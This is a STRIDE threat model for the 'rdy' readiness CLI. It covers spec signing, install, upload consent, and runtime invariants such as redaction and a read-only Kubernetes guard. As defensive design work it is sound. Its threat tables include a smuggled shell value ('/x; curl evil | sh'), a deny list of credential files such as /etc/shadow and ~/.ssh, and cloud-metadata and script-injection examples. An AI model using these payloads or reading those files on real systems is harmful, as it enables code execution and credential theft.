# 05 Threat model

Owner: security-reviewer. Revision 3, 2026-10-28. Status: ready for review.

Revision 3 aligns this model with ADRs 0013 to 0016, `02-engine-design.md` revision 3, the final
`04-bundle-and-redaction.md` and the SEC ticket ids in `11-backlog.md`. It changes only what disagreed:

- The probe facade (ADR 0014) replaces the four `Context` handles. No redirect is ever followed.
- INV-12 uses the `is_forbidden` ranges. INV-08 uses the fixed PATH on every run. INV-05, INV-06,
  INV-07, INV-09, INV-10, INV-11 and INV-15 follow ADRs 0002, 0013, 0014, 0015 and 0016 and 02.
- Appendix A I3 names ADR 0016 and `%USERPROFILE%\rdy-reports`.
- Appendix F and INV-15 follow 04: span union, `Redacted<T>`, per-run HMAC tags from `ring`, `jwt` in
  M1, 28 cases in M1 and 60 in M2, cap-boundary cases in M1.
- Surface 4 follows 04 section 6 and adds INV-21 to INV-27.
- The HSTS control in Appendix C T1 moves from M1 to M2, before M2-019.
- Tickets implied maps every SEC id to its `11-backlog.md` id. No SEC id changed.

Revision 2 followed the code-reviewer review (`reviews/05-threat-model-review-by-code-reviewer.md`).

This is a STRIDE threat model for `rdy` at M1 scope, with the M2 bundle and upload paths as requirements.
It follows the accepted ADRs (0001 to 0016), the redaction and upload contract in 04, and the install and
signing contract in 06. Where I disagree with an ADR, the finding lives in a review file under `reviews/`
(cited as "ADR review MF-nn or SF-nn"), not here as a second design.

Each mitigation is tagged `[M1]` or `[M2+]` and points to a ticket: `SEC-nn` with its `11-backlog.md` id,
or "fold: <name>", an exit-test clause on the 11 ticket named. Likelihood (L) and impact (I) are H, M or L
for a design-partner run in M1. The STRIDE tables are in Appendices A to D. The body is the requirements,
the invariants and the tickets.

## The bounded sentence

In M1, the worst a malicious or buggy signed spec can make `rdy` do is this:

- run built-in read-only checks;
- open connections to the peers in INV-11 (spec endpoints, the configured proxy, system resolvers, the
  selected Kubernetes API server). A redirect is recorded, never followed;
- write one report into one new output directory.

It cannot run commands the spec names, write anywhere else, change the cluster, read Kubernetes Secrets
or send result data anywhere. It can make `rdy` reveal spec hostnames to the network through DNS, SNI and
HTTP requests. That is the point of a network check.

Everything that would break this sentence is M2 or later and gets its own review: `custom.exec` (M4,
ADR 0005), file collection and upload (M2, 04), self-update (06).

## Surface 1: the CLI as a privileged process

**Assets.** Host integrity (root). Cluster integrity (cluster-admin kubeconfig). Secrets root can read
(`/etc/shadow`, keys, `/proc/*/environ`, kubeconfig tokens, proxy credentials). The report itself, which
maps the environment. The customer's trust.

```text
 operator shell: root and/or cluster-admin kubeconfig
        |  argv, env, cwd, KUBECONFIG
        v
 +------------------------------- rdy process -------------------------------+
 | spec bytes --[TB1: bounded read, verify]--> parse --> engine --> checks    |
 |                                                         |                  |
 |                          [TB2: probe facade (ADR 0014), guarded kube       |
 |                           client; policy + action log]                     |
 +---------------------------------------------------------|------------------+
     |              |                 |                |              |
  /proc, /sys,   child processes   kube API server   peers in       kubeconfig
  files (read,   (fixed program,   (runtime guard)   INV-11         exec plugin
  denylist)      no shell input)                                    (named exception)
     |
     | [TB3: redaction before write]
     v
  output dir (new, 0700, files 0600) --[TB4: carried out by hand, or upload in M2]--> vendor
```

TB2 is the central control (ADR 0014, 02 "The probe facade"). Every file read, env read, command, name
lookup, TCP connection, TLS handshake, HTTP request and native OS call goes through one `Probe`. Each
check's `Probe` is scoped to its `CheckInfo` manifest and host set, with policy and the action log above a
sealed `Backend`. The kube client is the guarded `ReadOnlyClient` owned by `rdy-checks-k8s` (ADR 0010).
The lint wall (the exact clippy items in 02 Appendix A) and the direct dependency allowlist per check crate
keep raw process, file, socket, thread, env and kube client APIs out of check code (INV-07).

STRIDE table: Appendix A.

### Kubernetes read-only rule and how it is enforced

The allowlist (ADR 0010 as amended, 02 Appendix B):

- GET and LIST on the exact resource list in `rdy_checks_k8s::ALLOWED`, each entry cited by a check.
  ConfigMaps metadata-only if ever needed. Never `secrets`, at any path. No subresources, no `watch`.
- POST only to `selfsubjectaccessreviews`, `selfsubjectrulesreviews` and `selfsubjectreviews`. The last
  one takes exactly one fixed body, compared byte for byte, and only `username` and `groups` are kept.
- Nothing else. 03's optional `dry_run: true` pod create for `k8s.admission` is rejected in M1. It
  conflicts with ADR 0010 and waits for an ADR 0010 amendment (Decisions needing an ADR).

Enforcement is at runtime. A tower layer added through `kube::client::ClientBuilder` checks method and
path on every request and fails closed: the request never leaves, and the check reports `Error`.
`connect()` returns only the guarded client type and `K8sFamily::new` accepts only that type, so there is
no unguarded client to pass. Inside `rdy-checks-k8s`, only the client module may name a kube client or
config type (02 Appendix A), so a check cannot build a second client. The mock API server test from
ADR 0010 stays as a second line.

### Residual risks

- Root is root. Read-only behaviour, a small dependency set and the action log shrink the trust needed.
  They do not remove it.
- Exec plugins run whatever the operator's kubeconfig says.
- Process escape (M1-038): `rdy` kills a timed-out command's whole process group, but a program that
  calls `setsid` or `setpgid` for a child puts that child in a new group and it survives. The M1 command
  allowlist has no such program, and on Windows only `whoami.exe` runs, which starts no children. The
  fixes are M2: a Linux cgroup kill (`cgroup.kill`) or a child subreaper that walks descendants, and
  Windows job objects (M2-006). Until then a stray process can outlive a run. Descriptors above 2 that
  `rdy` inherited from its parent also reach children until the command policy closes them (M1-039).
- A signed spec can probe internal endpoints it lists. Results stay local unless the customer sends them.
- Windows output files inherit folder ACLs, and macOS honours inheritable ACEs on the parent before mode
  bits. Both are named in the report's notes until SEC-58 (ADR 0016).
- TLS (ADR 0014): on Linux the facade reads only PEM bundles (`SSL_CERT_FILE`, `SSL_CERT_DIR`, the
  standard paths), so a proxy CA added only to NSS or a Java keystore is invisible. There is no
  revocation check in M1, and the report says so. webpki rejects certificates with no SAN, and SHA-1
  signatures, that some old appliances still issue. `net.tls_intercept` reports "rejected by rustls
  policy" as its own result, and docs explain `SSL_CERT_FILE`.
- Reports are customer-attested. A customer can edit one before sending it.

## Surface 2: the spec supply chain

**Assets.** The vendor's minisign secret key. The customer's `trust.yaml`. Spec integrity. The
customer's decision to run.

```text
 vendor (rdy spec sign / stock minisign)        transport (untrusted)          customer host
 +-----------------------------------+   spec + .minisig    email, link,    +---------------------+
 | secret key, encrypted, 0600       | ------------------>  file, USB  ---> | rdy verify / run    |
 +-----------------------------------+         TB5                          | trust.yaml     TB6  |
                 \                                                          +---------------------+
                  \--- public key and fingerprint, out of band (vendor docs, SE) ----^
```

The design is ADR 0002: minisign format, verified by `rdy-spec` over strict ed25519 (ADR 0018), keys pinned per product in
`trust.yaml` by `rdy trust add`, and `rdy run --key` for one run. There is no `--trust-key`. This model
adds these requirements on top:

1. **Order.** Read the spec and `.minisig` with bounded reads. Take the key id from the `.minisig` and the
   product from the signed trusted comment. Find a key pinned for that product with that id. Verify the
   raw bytes with `allow_legacy = false`. Only then parse. After parsing, `metadata.product` must equal the
   pinned product and the trusted-comment product. This is compatible with ADR 0002 and gives INV-01.
2. **Weak keys.** Small-order and malformed public keys are refused at `rdy trust add` and `--key`, using
   the Wycheproof vectors run against the verifier.
3. **Trust store ownership.** A user run reads `$XDG_CONFIG_HOME/rdy/trust.yaml`, then `/etc/rdy/trust.yaml`.
   A root run (euid 0) reads only `/etc/rdy/trust.yaml`, whatever `HOME` or `XDG_CONFIG_HOME` say, because
   macOS `sudo`, `sudo -E` and `su` without `-` keep them. The file and its directory must be root-owned
   and not group or world writable. The file must not be a symlink. On violation: exit 64 with a fix hint
   naming the path and the `chown` and `chmod` to run. Writes are atomic, mode 0644. On Windows the system
   store is `%ProgramData%\rdy\trust.yaml`, and the rule is "writable only by Administrators and SYSTEM".
4. **`--allow-unsigned`** is read from argv only, covers only a missing signature, and stamps the
   reports. A present but failing signature exits 64 with or without the flag, and its hint never names
   the flag (ADR 0002 decision 7).
5. **Domain separation.** The trusted comment must be exactly `rdy-spec-v1 product=<slug>
   signed_at=<RFC 3339>`; anything else is refused (ADR 0002 decision 1).

STRIDE table: Appendix B.

### Residual risks

- Key distribution is manual in M1. Pinning the wrong key trusts the wrong vendor.
- No revocation in v1 (ADR 0002). A leaked key stays trusted until removed by hand.
- From M2, the portal is in the trust chain. The bounded sentence is what limits a compromised portal.

## Surface 3: install script and release pipeline

06 owns the mechanics. Its table "Install and signing contract (agreed with 05)" is the security
contract for this surface. **I confirm every row of it**, with one disagreement:

- **Hash check portability.** The verification line `sha256sum --ignore-missing -c SHA256SUMS` is
  GNU-only. busybox (Alpine) lacks `--ignore-missing`, and macOS has `shasum`. A script that falls back to
  "skip" on such a host would install an unchecked binary. Requirement: `install.sh` selects the single
  `SHA256SUMS` line whose file name equals the downloaded archive name exactly, computes the digest with
  `sha256sum`, `shasum -a 256` or `openssl dgst -sha256` (first one present), and compares. If none is
  present, or no line matches, it stops. The docs command may keep `--ignore-missing` with the macOS
  alternative next to it.

Also confirmed: the exact signer identity
`https://github.com/getrdy-io/rdy/.github/workflows/sign-release.yml@refs/tags/v<VERSION>` pinned per
version in `install.sh`; the human regexp in 06 allows `-alpha.N` tags; `scripts/verify-release.sh`
holds the one canonical command. Immutable releases are 06's plan. If the sandbox proof fails, the
fallback control is the signature check, which fails closed on any swapped asset. 06 records the gap.

```text
 maintainer --tag v*--> GitHub (rulesets) --> release (dist) --> sign-release.yml (env "release", approval)
                                                                   | cosign keyless, OIDC
                                                                   v
                        GitHub Release: archives, SBOM, install.sh, SHA256SUMS, SHA256SUMS.sigstore.json
                                                                   ^
 customer: curl ... getrdy.io/install | sh  (M2; M1 uses the pinned release URL) -+
           TB7: script origin                     TB8: artifact origin
```

STRIDE table: Appendix C.

### Residual risks

- curl-pipe-sh trusts getrdy.io for the script itself.
- One maintainer, so no two-person release review.
- cosign is rarely installed. Fail-closed costs first-run convenience. 06 accepted that.
- No Authenticode or notarization in M1, so SmartScreen and some EDR tools will flag `rdy` (SEC-50).

## Surface 4: the upload path (M2)

M1 has no upload code. 04 section 6 is the contract, and the full STRIDE table is Appendix D. The
requirements M2 must meet:

1. **Consent.** Nothing leaves unless the user typed `rdy upload` (or `--upload` on `run` or `bundle`)
   and then answered yes or passed `--yes`. The default is no. A non-TTY run never prompts and needs
   `--yes`. `--yes`, `--upload` and `--server` come from argv only. A non-default server is shown in bold
   in the prompt and the receipt, and on a TTY `--yes` does not skip the question for it.
2. **No socket before consent.** Before the answer there is no connection to, and no DNS query for, the
   upload origin. After a no, never. `rdy bundle` talks only to the Kubernetes API, through the guard.
3. **Pre-flight, no network.** One streaming pass over one handle opened with `O_NOFOLLOW` (Windows:
   reparse points refused). The file must be a regular file owned by the euid, at most 100 MiB for a
   bundle and 16 MiB for a result. A result must parse as a typed `Report`; HTML is refused. A bundle must
   decode within bounds (`window_log_max(23)`, 257 MiB of output, 13,000 entries), and its `manifest.json`
   and entry hashes must match. A residual scan with the redactor runs over every entry. A hit exits 64
   with rule names and paths, never text. The size and sha256 from this pass are the consent values.
4. **Exact bytes.** The body streams from the pre-flight handle and is hashed again on the way. The last
   chunk is held back until hash and count equal the consent values. Otherwise the request aborts and
   `rdy` exits 70 ("the file changed during upload").
5. **Token.** From `--token-file`, `RDY_TOKEN` or a hidden prompt, never argv. A hidden `--token` flag
   exits 64 with the reason. Before any request the token must match the 04 grammar: `rdy_st_` and then
   20 to 64 ASCII letters or digits. It is sent only in `Authorization: Bearer`, masked in `Debug` and
   `Display`, and is write-only, per share link, expiring and revocable (SEC-42).
6. **Server output is data.** The client reads only `upload_id` and `max_bytes` from the create reply,
   and `receipt_id`, `upload_id`, `received_bytes` and `sha256` from the send reply, each against a fixed
   grammar. It builds every URL itself. The echoed id, count and hash must equal its own. Error codes map
   to fixed local messages. At most 64 KiB of a response is read.
7. **Receipt.** `upload-receipt-<ts>.json` (`create_new`, 0600, through a `cap-std` handle) records the
   server origin, file name, kind, size, sha256, upload id, receipt id and the server's echo. No token, no
   argv. It is the only write `rdy upload` makes.
8. **Transport.** No redirects, the address policy on the server address, no cookies, no telemetry. The
   HTTP stack and verifier are still open: 04 names reqwest with the platform verifier, and ADR 0014 bans
   both in M1. One ADR decides before M2-026 (M1-001 closure check, CF-03).

## Security invariants

Each is a statement that CI tests. The ticket in the test column carries it.

| Id | Invariant | Test |
|---|---|---|
| INV-01 | No spec byte reaches the YAML parser before verification succeeds, except under `--allow-unsigned` or `rdy spec lint`. | Parser spy: a tampered spec is never parsed (M1-120). |
| INV-02 | Spec (1 MiB), `.minisig` (4 KiB) and `trust.yaml` (256 KiB) are read through `take(limit + 1)`. Oversize exits 64. | Oversize files, a FIFO and `/dev/zero` each exit 64 within 1 s. |
| INV-03 | A spec verifies only if its key id is pinned for the trusted-comment product and `metadata.product` matches. | Unpinned id gives "unknown key"; a key pinned for A fails on B; a comment and metadata mismatch fails. |
| INV-04 | With euid 0, only the system store is read, and it is refused unless root-owned, not group or world writable, and not a symlink. | Run under `sudo` in CI with `HOME` and `XDG_CONFIG_HOME` set to a user dir holding a pin; the pin is ignored. Bad owner, mode and symlink cases exit 64 (M1-121, SEC-60 M1-122). |
| INV-05 | `--allow-unsigned` is read from argv only. `RDY_ALLOW_UNSIGNED=1` and an `allow_unsigned` config key have no effect. An unsigned run says `signature: unsigned` in JSON and HTML. A present but failing signature exits 64 with or without the flag. | Integration tests and golden output (M1-126, SEC-59 M1-130). |
| INV-06 | Duplicate keys, anchors, aliases, merge keys, multi-document input and unknown top-level keys exit 64. Unknown check ids and unknown per-check fields become `Skipped` and run no code. A required check that did not run makes the verdict `not_ready` (ADR 0013). | Fixtures, including the plan's example with `gpu.cuda` and `aws.iam` (M1-017, M1-035). |
| INV-07 | Check crates reach the OS and clusters only through the probe facade and the guarded kube client (ADR 0014). `clippy.toml` lists the exact items in 02 Appendix A: std file, directory, link, permission, process, socket, thread and env APIs, and kube client and config types outside the k8s client module. `allow(clippy::disallowed_` is legal only in the facade's `live/` module and the k8s client module. `ci/check-crate-deps.toml` allowlists each check crate's direct dependencies. The named exceptions are kube's own sockets, its proxy CONNECT and TLS, and its exec plugins, each recorded in the action log. | Each entry, used once in `tests/lint-wall`, fails clippy (M1-044; kube entries in M1-102). Adding `walkdir` to a check crate fails CI. Action-log completeness under strace (SEC-22). |
| INV-08 | No shell receives spec-derived input. Programs resolve from the fixed search path `/usr/sbin:/usr/bin:/sbin:/bin` on every run, root or not, plus a check's declared absolute extra directories. The environment is cleared, then `LC_ALL=C`, the fixed `PATH` and declared names only; no `LD_*` or `DYLD_*`. In M1, Windows runs only `whoami.exe` from a constant System32 path. Shells and `sudo`, `su`, `doas`, `pkexec`, `runas` are refused. | Command policy tests: shells and the sudo family refused, PATH fixed for non-root runs, `LD_PRELOAD` never reaches a child, every program name is a source constant (SEC-18 M1-039). |
| INV-09 | Report files are written only inside one new output dir, created right after verification and held for the run (ADR 0016): Unix 0700 and 0600 with `fchmod`, `create_new`, no symlink following, temp plus rename; Windows not a reparse point. The only other writes are `trust.yaml` on an explicit pin and, from M2, `rdy-bundle-<product>-<ts>/` under the same rules and `upload-receipt-*.json` (`create_new`, 0600). | Pre-planted symlink and junction, existing name, setgid parent and mode tests; `rdy run` without a pin touches no path outside the output dir (SEC-19 M1-036, M1-037). |
| INV-10 | `rdy` exits 70 before the spec is read if any uid or gid value (real, effective, saved, filesystem) differs from the real one, `CapEff` or `CapAmb` is nonzero for a non-root uid, or `AT_SECURE` is set. macOS compares the four ids. Not applicable on Windows. | Injected ids, a recorded `/proc/self/status` and auxv (M1-042). |
| INV-11 | Network peers are only: spec endpoints (at most 64 distinct hosts, each reachable only from the checks that list it), the configured proxy, system resolvers (queries for spec hostnames only), the selected API server, from M2 spec `ntp_servers`, and, only in `rdy upload` after consent, the upload origin. Redirects are recorded, never followed. The kube exec plugin is the named exception, logged. A second named exception, on Linux: the NSS sources that `getent ahosts` reaches for a spec hostname (`net.dns`, ADR 0006 decision 5), as `nsswitch.conf` lists them, such as LDAP, sssd, mDNS and nss-resolve. rdy does not pick those peers; it runs `getent` only for validated spec hostnames, and the action log records each run. | Linux CI: the fixture suite runs under `sudo unshare -n` (loopback only, fixture DNS and servers on loopback) inside `strace -f -e trace=connect,sendto,sendmsg`. Every destination must be a loopback fixture address. `sudo` is used because Ubuntu 24.04 runners block unprivileged user namespaces (SEC-22 M1-128). |
| INV-12 | Every connect refuses literal or resolved addresses for which `is_forbidden` holds: 169.254.0.0/16, 100.100.100.200/32, fe80::/10, fd00:ec2::/64, and the IPv4-mapped, IPv4-compatible and `64:ff9b::/96` forms of each IPv4 range (ADR 0014 decision 2). Through a proxy, only the CONNECT hostname can be checked, and a forbidden literal target is refused before any byte is sent. | A table test of `is_forbidden`; fixture DNS resolving to each range, `::ffff:169.254.169.254` and `64:ff9b::a9fe:a9fe`; a CONNECT to a literal 169.254.169.254 (M1-091, SEC-21 M1-094). |
| INV-13 | Net checks keep status, a fixed list of headers, timing and certificate metadata. They read at most 64 KiB of body and discard it, and never follow a redirect. | A body canary never appears in the output; a 302 returns its `Location` host without a second request (M1-093). |
| INV-14 | The kube client sends only allowlisted requests (section above). Anything else fails closed in the tower layer. | The guard rejects a DELETE, a POST to `pods`, a GET on `secrets` and an unlisted resource; the mock server records only allowed requests across the fixture run (M1-103, M1-104). |
| INV-15 | Every string field of the result and every log line passes the redactor before any cap or write (ADR 0015, 04 section 3). Rules find spans in the original text, and overlapping spans merge into their union. Placeholders are `[REDACTED:<rule>:<tag>]`; the tag is an HMAC-SHA256 under a per-run key from `ring` that is never written. Writers take only `Redacted<T>`, which has no public constructor, `From`, `Default`, `Deserialize` or `DerefMut`. Facade-truncated buffers lose their cut edge line, and a run-scoped known-secret set is removed by exact match and by edge prefix or suffix. Redaction fails closed: no raw fallback. | Canaries in env, proxy URL, kubeconfig and command output never appear in JSON, HTML or stderr at `RUST_LOG=trace` (M1-056). Overlapping spans give one placeholder (SEC-25 M1-048). Canaries across each facade cap (M1-061). Writers do not compile with a plain `Report` (M1-062). |
| INV-16 | The HTML report has the ADR 0003 CSP, loads no remote resource, and embeds JSON with `<`, `>` and `&` escaped as `\u003c`, `\u003e` and `\u0026`. | Golden test with script payloads; a headless render with no network requests. |
| INV-17 | Untrusted strings printed to the terminal contain no control characters. | Unit test with ANSI sequences. |
| INV-18 | `unsafe_code = "forbid"` in `[workspace.lints]`. One named FFI module has a `deny` override, every block has a `// SAFETY:` comment, and CI keeps an allowlist of such files. | CI fails on a new file with `unsafe`. |
| INV-19 | `install.sh` behaves as 06's contract table says, plus the hash rule above. | 06's install.sh tamper tests, with wrong-identity, truncation, no-hash-tool and no-matching-line cases. |
| INV-20 | (M2) No upload without the command or flag and then a yes. Exact bytes are sent, and digests match the receipt. | Fake server tests (SEC-41 M2-078, M2-080). |
| INV-21 | (M2) Every byte in a bundle passed the redactor, and no temp file holds raw bytes. | Canaries in collector fixtures appear in no bundle entry and in no file outside the bundle dir (M2-075). |
| INV-22 | (M2) The manifest holds no raw value, raw hash or tag key. Raw sizes are `raw_size_kib`, rounded up to a multiple of 4 KiB. From M1, nothing hashes raw content except 01's `host_id`. | The 04 Appendix C sample validates and no field holds a raw hash; a 4,097-byte raw entry gives `raw_size_kib: 8`. |
| INV-23 | (M2) `rdy bundle` opens no connection except the guarded kube connection. | No-socket tests under `unshare -n` and strace (M2-075). |
| INV-24 | (M2) No collected path is on the deny list or reached through a symlink outside its glob's literal prefix. A spec can add redaction but never remove a built-in rule. Only the customer's argv `--keep-emails` turns a group off, and the manifest and the consent screen show it. | Path policy tests (SEC-43 M2-067); an unknown group exits 64; a `--keep-emails` bundle lists `groups_off_by_flags: ["emails"]` (M2-057). |
| INV-25 | (M2) Bytes sent hash to the consent value. A file changed after consent aborts with exit 70. | Fake server tests (M2-080). |
| INV-26 | (M2) The token never appears in argv, logs, the receipt, any file or an error. | A canary token at `RUST_LOG=trace` (M2-077, M2-080). |
| INV-27 | (M2) No socket and no DNS query for the upload origin before the consent answer, or after a no. | Under `unshare -n` and strace. A bad server, a token on argv, a group-readable token file, a residual hit, a zstd bomb, a 20,000-entry tar and a non-TTY run without `--yes` each exit 64 before any request (M2-076, M2-080). |

Notes on INV-15 from the M1-048 review. The 4-byte tag shows that two redacted values are equal, and nothing
else, because the key never leaves the process (04 section 3.3). The key-name rule has no 16 KiB cap: its value
runs to the end of the line or YAML block, because a cap would leave the tail of a long secret behind.

## Dependency policy

`deny.toml` encodes the bans, licenses and sources below (M1-004). The check-crate wrappers land in M1-044. These are the rules:

- crates.io only. No git sources. `Cargo.lock` committed, `--locked` everywhere.
- Bans: `openssl`, `openssl-sys`, `native-tls`, `hyper-tls`, `tokio-native-tls`, `aws-lc-sys` and
  `aws-lc-rs` (ADR 0009), `serde_yaml`, `serde_yml` (RUSTSEC-2025-0068), `libyml` (RUSTSEC-2025-0067),
  `atty` (unmaintained RUSTSEC-2024-0375, unsound RUSTSEC-2021-0145), and `reqwest` in M1 (ADR 0014).
  Wildcards denied, with `allow-wildcard-paths = true`.
- Check crates: only the direct dependencies listed in `ci/check-crate-deps.toml` (ADR 0014 decision 7).
  `deny.toml` wrappers keep I/O crates out of them as a second line.
- Licenses allowed: Apache-2.0, MIT, BSD-2-Clause, BSD-3-Clause, ISC, Zlib, Unicode-3.0, CC0-1.0, BSL-1.0,
  CDLA-Permissive-2.0. MPL-2.0 only as a reviewed per-crate exception. Never GPL, LGPL, AGPL, SSPL, BUSL
  or unknown.
- Advisories: the PR gate uses `unmaintained = "workspace"`. The daily audit uses `"all"` and opens an
  issue instead of blocking. An ignore names a ticket and expires within 90 days.
- A new direct dependency needs security-reviewer approval: purpose, maintainers, `unsafe`, `build.rs`,
  license.

## SECURITY.md

`SECURITY.md` at the repo root covers versions, scope, reporting, timelines and safe harbor.

## Appendix A: Surface 1 STRIDE

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Wrong cluster or identity | `KUBECONFIG` points at prod | M | M | `[M1]` Show context, server and user (from SelfSubjectReview) before the first call and in the report. | SEC-24 (M1-103), M1-102 |
| S2 | Program hijack | A fake `getenforce` early in PATH; a planted `powershell.exe` next to `rdy.exe` | M | H | `[M1]` Programs resolve from `/usr/sbin:/usr/bin:/sbin:/bin` on every run, plus declared absolute directories. Windows M1 runs only `whoami.exe` from a constant System32 path. Cleared env plus declared names (INV-08). | SEC-18 (M1-039) |
| T1 | Write outside output dir | A pre-planted symlink in a shared dir; `metadata.product: ../../etc/cron.d/x` | M | H | `[M1]` Slug-validated product. A new dir opened early and held, `create_new` files, no symlink following, temp plus rename (ADR 0016). | SEC-19 (M1-036) |
| T2 | Spec input reaches a shell | Spec value `"/x; curl evil \| sh"` | L | H | `[M1]` Argv only. Shells are refused. No shell gets spec-derived input. | SEC-18 (M1-039) |
| T3 | Markup in the HTML report | Proxy cert subject or node name carries `<script>` | M | M | `[M1]` askama autoescape, no `safe`, CSP `default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'` (ADR 0003), embedded JSON escaped as `\u003c`, `\u003e`, `\u0026`. | fold: embed JSON (M1-078) |
| T4 | Terminal escape injection | Banner with ANSI sequences | M | L | `[M1]` Escape control characters in untrusted strings. | fold: error types (M1-021) |
| R1 | "What did it do on my box?" | No record after the run | M | M | `[M1]` Action log in the result. `[M2+]` `rdy run --dry-run`. | SEC-17 (M1-040), SEC-40 (M2-040) |
| I1 | Secrets in the report | `HTTPS_PROXY=http://svc:pa55@proxy:3128` echoed as evidence; an HTTP error carrying a URL; a key cut by an output cap | H | H | `[M1]` Every string field passes the redactor before any cap or write, with span union, the truncated-edge rule and the run-scoped known-secret set (INV-15). | SEC-25 (M1-048), SEC-26 (M1-063), M1-060, M1-061, M1-062 |
| I2 | Secrets in logs | `RUST_LOG=trace` makes a dependency print a header | M | H | `[M1]` A redacting log layer always, installed first in `main`. Default caps on hyper, h2, rustls, tower and kube apply only when `RUST_LOG` is unset. | M1-056 |
| I3 | Report readable by others | Report in `/tmp`, or in a shared Windows folder such as the System32 start folder of an elevated prompt, which passes on its ACL | M | M | `[M1]` Unix 0700 and 0600 with `fchmod`. Windows: default `%USERPROFILE%\rdy-reports` (ADR 0016); `.` only when given explicitly. ACL inheritance on Windows and inheritable ACEs on macOS are a residual named in the report until SEC-58. | SEC-19 (M1-036), M1-037, SEC-58 (M2-085) |
| I4 | Kubernetes secret material | LIST `secrets`; a full pod LIST returns literal env values | L | H | `[M1]` Guard forbids `secrets`. Pod, event and deployment responses deserialize into minimal structs, so env values are never held. | fold: kube guard (M1-103, M1-104) |
| I5 | Root reads private files | A check walks `/proc/*` and reads `environ` | M | H | `[M1]` Facade deny list on the real path: `/etc/shadow`, `/etc/gshadow`, `/etc/sudoers*`, `*/.ssh/*`, private key files, `~/.kube/*`, `/proc/*/environ`, `cmdline`, `mem`, `fd`, `root` and `map_files`, `/proc/kcore`, `/dev/*`. | SEC-17 (M1-040), M1-045 |
| I6 | Phone home | Telemetry or update check | L | H | `[M1]` None exists. strace contact-set test. | SEC-22 (M1-128) |
| I7 | Internal recon or metadata theft via spec | Endpoint or redirect to `169.254.169.254` | M | M | `[M1]` `is_forbidden` on every literal or resolved address, per-check host sets, redirects never followed (ADR 0014). No bodies stored. | SEC-21 (M1-094) |
| D1 | Production impact | Bandwidth sample saturates a link; 5 MiB command output | M | M | `[M1]` Per-check timeouts and a run deadline with a watchdog (ADR 0004, 02), capped output, capped bandwidth sample (03). | SEC-18 (M1-039), M1-043 |
| E1 | Cluster mutation | A bug sends a write with cluster-admin | L | H | `[M1]` Runtime tower guard on the kube client (above). | fold: kube guard (M1-103) |
| E2 | Privilege-carrying install | `rdy` installed setuid, setgid or with file capabilities | L | H | `[M1]` Exit 70 before the spec is read, as INV-10 says. | M1-042 |
| E3 | Self-escalation | `rdy` calls `sudo` | L | H | `[M1]` `sudo`, `su`, `doas`, `pkexec`, `runas` are refused. Root-only checks report Skipped. | SEC-18 (M1-039) |
| E4 | Memory corruption from crafted input | Crafted spec, command output, HTTP response | L | H | `[M1]` Workspace `unsafe_code = "forbid"`, one named FFI module. `[M2+]` fuzzing. | fold: workspace skeleton (M1-003), SEC-45 (M2-063) |
| E5 | kubeconfig exec plugin | `aws eks get-token` runs with the user's env | L | H | `[M1]` Named exception (ADR 0010 decision 7). kubeconfig only from `--kubeconfig`, `KUBECONFIG` or the default path. The report names the binary run. | SEC-24 (M1-103), SEC-63 (M1-041) |

## Appendix B: Surface 2 STRIDE

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Impersonated vendor | Attacker signs with their own key and emails "acme-platform" | M | M | `[M1]` Unpinned key id means refuse. Output shows the fingerprint and the local pin note, never a name from the spec. | fold: verify minisign (M1-120), SEC-59 (M1-130) |
| S2 | Planted trust | A local user pins a key that a root run then trusts | M | H | `[M1]` Requirement 3. | fold: trust store (M1-121), SEC-60 (M1-122) |
| S3 | Self-certifying delivery (M2) | Portal serves the spec and its key on one channel | M | H | `[M2+]` Explicit pin on first use; a key change for a pinned product is a hard failure (ADR 0002 decision 6). | SEC-47 (M2-033) |
| T1 | Tampered in transit | `min: 32Gi` edited to `min: 1Gi` | M | M | `[M1]` Verify raw bytes before parsing. | fold: verify minisign (M1-120) |
| T2 | Signature stripping plus a nudge | "Just add `--allow-unsigned`" | M | M | `[M1]` argv only, red banner, `signature: unsigned` in JSON and HTML, hints never suggest the flag, a failing signature is refused even with it. `[M2+]` TTY confirmation (cli-ux). | fold: rdy verify (M1-126), SEC-59 (M1-130), SEC-56 (M2-034) |
| T3 | Parser differential | Duplicate keys or a second YAML document | L | H | `[M1]` One document; duplicate keys, anchors, aliases, merge keys and tags rejected (ADR 0001). | fold: wire serde-saphyr (M1-017), SEC-62 |
| T4 | Rollback | Replay an older signed spec | L | L | `[M1]` Report shows `signed_at` and spec digest. `[M2+]` portal serves latest. | SEC-46 (M2-032) |
| R1 | Dispute over which spec ran | "We never sent that" | L | M | `[M1]` Result records spec sha256, key id, fingerprint and product. | fold: verify minisign (M1-120), SEC-61 (M1-121) |
| I1 | Vendor key leak | Secret key committed or printed | M | H | `[M1]` Encrypted by default, `create_new` 0600, `spec sign` refuses readable key files, secrets never printed. | fold: keygen and sign (M1-125) |
| D1 | Parser exhaustion | Billion laughs, deep nesting, `/dev/zero` as the spec | M | L | `[M1]` Bounded reads, ADR 0001 limits; mostly unreachable once INV-01 holds. | fold: wire serde-saphyr (M1-017) |
| E1 | Capability creep | Unknown check id, exec block | M | H | `[M1]` Unknown check ids and fields become Skipped, no code runs for them, and a required one gives `not_ready` (ADR 0005, 0007, 0013). Unknown top-level keys exit 64. No exec in M1. | fold: unknown ids (M1-035) |

## Appendix C: Surface 3 STRIDE

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Typosquat crate or domain | `cargo install rdy-cli` installs a squatter | M | H | `[M1]` Reserve names, including an `rdy-cli` placeholder (ADR review SF-12). | 06 reserve names |
| S2 | Wrong signer identity | A fork's workflow signs a build | M | H | `[M1]` Exact identity and issuer per 06. | SEC-06 and SEC-07 (M1-010) |
| T1 | getrdy.io serves a bad script | Registrar or Cloudflare takeover, DNS hijack | L | H | `[M1]` Hardware key or passkey MFA, registrar lock, DNSSEC, CAA. `install.sh` is in `SHA256SUMS`. Verify-first docs. `[M2]` HSTS, needed before M2-019 serves `getrdy.io/install`. M1 installs use the pinned GitHub release URL, not getrdy.io, and curl does not apply HSTS by default, so in M1 HSTS would protect only browser visitors. Deferral accepted by security-reviewer in revision 3. | SEC-05 (M1-008), M2-019, SEC-31 (M3-008) |
| T2 | Truncated script runs | Connection drops | L | M | `[M1]` `main()` guard (06). | SEC-08 (M1-014) |
